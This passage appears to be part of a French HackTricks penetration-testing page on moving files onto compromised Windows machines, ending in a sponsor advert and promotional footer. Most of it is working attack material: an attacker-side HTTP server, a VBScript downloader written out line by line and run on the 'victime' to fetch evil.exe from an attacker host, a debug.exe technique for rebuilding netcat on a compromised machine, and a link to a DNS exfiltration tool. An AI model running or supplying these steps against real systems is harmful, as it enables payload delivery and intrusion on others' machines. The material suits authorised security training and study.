- Mettre à jour régulièrement les systèmes d'exploitation et les logiciels pour corriger les vulnérabilités connues.
- Sensibiliser les utilisateurs aux risques de l'ingénierie sociale et aux techniques de phishing.
- Utiliser des outils de détection d'anomalies pour identifier les comportements suspects sur le réseau.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Victime**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

C'est une technique folle qui fonctionne sur les machines Windows 32 bits. L'idée est d'utiliser le programme `debug.exe`. Il est utilisé pour inspecter les binaires, comme un débogueur. Mais il peut également les reconstruire à partir de l'hexadécimal. Donc l'idée est que nous prenons des binaires, comme `netcat`. Ensuite, nous le désassemblons en hexadécimal, le collons dans un fichier sur la machine compromise, puis l'assemblons avec `debug.exe`.

`Debug.exe` ne peut assembler que 64 Ko. Nous devons donc utiliser des fichiers plus petits que cela. Nous pouvons utiliser upx pour le compresser encore plus. Faisons cela:
```
upx -9 nc.exe
```
Maintenant, il ne pèse que 29 ko. Parfait. Maintenant, démontons-le :
```
wine exe2bat.exe nc.exe nc.txt
```
Maintenant, nous copions-colons simplement le texte dans notre shell Windows. Et cela créera automatiquement un fichier appelé nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
